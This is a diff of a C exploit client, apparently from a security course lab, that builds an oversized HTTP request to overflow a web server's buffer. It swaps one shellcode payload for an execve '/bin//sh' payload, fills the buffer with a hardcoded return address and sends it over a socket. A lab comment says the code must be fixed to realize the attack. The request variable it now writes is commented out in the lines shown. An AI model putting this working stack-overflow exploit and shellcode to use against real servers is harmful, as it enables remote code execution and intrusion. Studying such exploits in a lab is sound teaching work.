@@ -16,7 +16,17 @@
 **create_shellcode.c will help you to create a shellcode.
 **fill in it there	 
 */
-  const char shellcode[] ="\x31\xc0\x50\x68\x2e\x74\x78\x74\x68\x65\x69\x2f\x61\x68\x61\x6e\x67\x6c\x68\x65\x2f\x6a\x69\x68\x2f\x68\x6f\x6d\x89\xe3\xb0\x0a\xcd\x80\x31\xdb\xb0\x01\xcd\x80";
+  const char shellcode[] = "\x31\xc0"
+  "\x50"
+  "\x68""//sh"
+  "\x68""/bin"
+  "\x89\xe3"
+  "\x50"
+  "\x53"
+  "\x89\xe1"
+  "\x99"
+  "\xb0\x0b"
+  "\xcd\x80" ;
 int main(int argc, char *argv[])
 {
   int  port = PORT;
@@ -59,14 +69,15 @@ int main(int argc, char *argv[])
   int i;
   addr_s=(int *)uri;
   for(i=0;i<260;i++)
-         addr_s[i]=0xbffff9fc;
-  for(i=0;i<strlen(shellcode);i++)
-           uri[i]=shellcode[i];
-      uri[1040]='\0';
-       uri[1039]='\n';
-       uri[1038]='\r';
-       uri[1037]='\n';
-       uri[1036]='\r';
+         addr_s[i]=0xbffff9e8;
+  for(i=4;i<strlen(shellcode);i++)
+           uri[i-4]=shellcode[i];
+     uri[1041]='\0';
+    // uri[0]='G';
+    // uri[1]='E';
+    // uri[2]='T';
+    // uri[3]=' ';
+    // uri[1040]=' ';
  
  
  
@@ -76,7 +87,7 @@ int main(int argc, char *argv[])
     you should fix the code to realize your attack
   */  
  // char *req ="GET / HTTP/1.1\r\n\r\n";
-  write(sock_client,uri,strlen(uri));
+  write(sock_client,req,strlen(req));
   
   //receive the response from web server
   char resp[1024];
